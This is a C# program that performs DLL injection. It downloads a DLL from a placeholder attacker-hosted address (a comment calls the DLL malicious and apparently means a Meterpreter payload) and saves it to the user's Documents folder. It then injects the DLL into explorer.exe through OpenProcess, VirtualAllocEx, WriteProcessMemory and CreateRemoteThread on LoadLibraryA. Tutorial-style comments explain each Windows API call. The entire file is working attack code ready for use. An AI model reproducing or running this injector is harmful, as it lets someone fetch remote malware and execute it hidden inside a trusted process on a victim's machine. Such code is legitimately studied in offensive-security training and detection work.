using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace dll_injection_c_
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
           uint processAccess,
           bool bInheritHandle,
           int processId
        );
        //Reserves, commits, or changes the state of region of memory withing virtual address space of a process.
        //Compared to VirtualAlloc, the Ex allows us to perform action in any process, not just our own.
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress, //Pointer to desired starting address for the region of pages you want to allocate. Address,Pointer = IntPtr
            uint dwSize, //Size of region of memory to allocate, in bytes. Size_T is uint.
            uint flAllocationType, //Type of memory allocation, refer to list here. https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex Also, can be uint to hold hexadecimal.
            uint flProtect //Type of memory protection for the region of page allocated. Holds hexadecimal so we can opt for uint.
        );

        //Allows us to copy data into the remote process. Unlike RtlMoveMemory which does not support remote copy.
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress, //Pointer to base address in the process which the data is written.
            byte[] lpBuffer,  //A buffer (or pointer to buffer) with the data that's to be written.
            Int32 nSize, //Size of the buffer above
            out IntPtr lpNumberOfBytesWritten //The pointer to a variable that receives the # of bytes transferred into the process.
        );

        //Supports the creation of remote process thread. 
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, //Handle to the process that the thread is to be created.
            IntPtr lpThreadAttributes, // A pointer to a SECURITY_ATTRIBUTES structure that defines the security desrciptor for the new thread. refer to https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
            uint dwStackSize, // Initial size of the stack
            IntPtr lpStartAddress, //A pointer to the application function to be executed by the thread and represents the starting address of the thread in remote process. 
            IntPtr lpParameter, //A pointer to a varaible passed to the thread
            uint dwCreationFlags, //flag that controls the creation of the thread. refer to the microsoft documentation.
            IntPtr lpThreadId //a pointer to a variable that receives the thread identifier. It should be out InPtr but we're not needing it so we're passing IntPtr.Zero.
            );


        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            //The path where the DLL will be stored.
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            //Change the ? to your IP that's hosting the met.dll. met.dll is just a user named DLL thats malicious.  
            wc.DownloadFile("http://?/met.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            //Open a process object. 
            //Double check the hexadecimal you're passing, make sure you are copying it from the documentation else you may run into an issue where you are missing an F at the end in 0x001F0FFF.
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("Failed to open process object");
            }


            //Allocate memory to the remote process that's readable/writeable. 
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to allocate memory to the remote process.");
            }

            IntPtr outSize;
            //Copy path and name of the DLL into it.
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
            
            if (res == false)
            {
                Console.WriteLine("Failed to write to process memory.");
            }

            //To locate LoadbLibraryA memory address from the remote process. Note: most native Windows DLLs are allocated at the same base address across all processes, and LoabLibraryA fits this case.
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            if (loadLib == IntPtr.Zero)
            {
                Console.WriteLine("Failed to locate LoadLibraryA");
            }

            //Create a remote thread to execute our DLL.
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("Failed to create remote thread.");
            }

        }
    }
}
